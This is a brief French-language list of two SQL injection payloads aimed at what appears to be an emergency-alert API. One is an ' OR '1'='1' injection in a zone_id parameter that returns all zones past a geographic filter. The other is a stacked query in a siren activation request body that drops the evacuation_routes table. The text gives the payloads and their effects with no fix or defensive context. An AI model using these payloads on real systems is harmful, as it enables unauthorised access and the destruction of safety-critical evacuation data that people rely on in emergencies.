GET /api/route?zone_id=' OR '1'='1' --
→ Retourne TOUTES les zones (contournement de filtre géographique)

POST /api/siren/activate
Body: {"magnitude": "6.5; DROP TABLE evacuation_routes; --"}
→ Destruction de la table des routes d evacuation (injection SQL)